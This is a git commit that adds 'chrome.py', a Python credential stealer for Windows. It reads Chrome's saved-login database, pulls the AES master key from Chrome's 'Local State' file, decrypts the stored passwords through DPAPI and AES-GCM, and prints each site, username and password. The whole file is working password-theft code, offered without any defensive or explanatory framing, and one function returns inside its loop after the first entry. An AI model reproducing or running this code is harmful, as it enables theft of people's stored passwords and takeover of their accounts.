39e635d85ba649641c3e1e9a444fd952ac98b75d
jlemma54 <62192024+jlemma54@users.noreply.github.com>
2020-07-25 15:18:41 -0400

    initial upload of chrome file

---
+++ chrome.py
@@ -0,0 +1,57 @@
+import os
+import sqlite3
+import win32crypt
+import base64
+import json
+from Cryptodome.Cipher import AES
+
+
+def get_chrome():
+    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
+    c = sqlite3.connect(data_path)
+    cursor = c.cursor()
+    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
+    cursor.execute(select_statement)
+
+    login_data = cursor.fetchall()
+
+    cred = {}
+
+    string = ''
+
+    for url, user_name, pwd in login_data:
+        pwd = win32crypt.CryptUnprotectData(pwd)
+        cred[url] = (user_name, pwd[1].decode('utf8'))
+        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url, user_name, pwd[1].decode('utf8'))
+        return string
+
+def get_master_key():
+    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = master_key[5:]  # removing DPAPI
+    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+    return master_key
+
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+
+def decrypt_password(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = generate_cipher(master_key, iv)
+        decrypted_pass = decrypt_payload(cipher, payload)
+        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
+        return decrypted_pass
+    except Exception as e:
+        # print("Probably saved password from Chrome version older than v80\n")
+        # print(str(e))
+        return "Chrome < 80"
